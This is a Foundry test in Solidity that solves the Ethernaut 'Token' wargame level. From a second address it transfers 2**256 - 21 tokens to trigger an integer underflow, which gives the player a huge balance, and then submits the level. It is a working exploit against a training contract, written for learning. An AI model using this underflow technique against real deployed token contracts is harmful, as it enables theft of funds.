// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Token/TokenFactory.sol";
import "../src/Ethernaut.sol";

// forge test --match-contract TokenTest -vvvv
contract TokenTest is Test {
    Ethernaut ethernaut;
    address player = address(100);

    function setUp() public {
        // create new instance of ethernaut
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether); // give our address 5 ether
    }

    function testTokenHack() public {
        /****************
         * Factory setup *
         *************** */
        TokenFactory TokenFactory = new TokenFactory();
        ethernaut.registerLevel(TokenFactory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(TokenFactory);
        Token ethernautToken = Token(payable(levelAddress)); // 1000 is initial supply
        vm.stopPrank();
        /****************
         *    Attack     *
         *************** */
        // this level is a classic example of overflow, which is now prevented by default in Sol ^8.0.0
        vm.startPrank(address(200)); // need to use another address
        // default _initialSupply is set to 20
        ethernautToken.transfer(player, 2**256 - 21); // transfer a quantity of token > 2**256
        vm.stopPrank();
        vm.startPrank(player);

        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
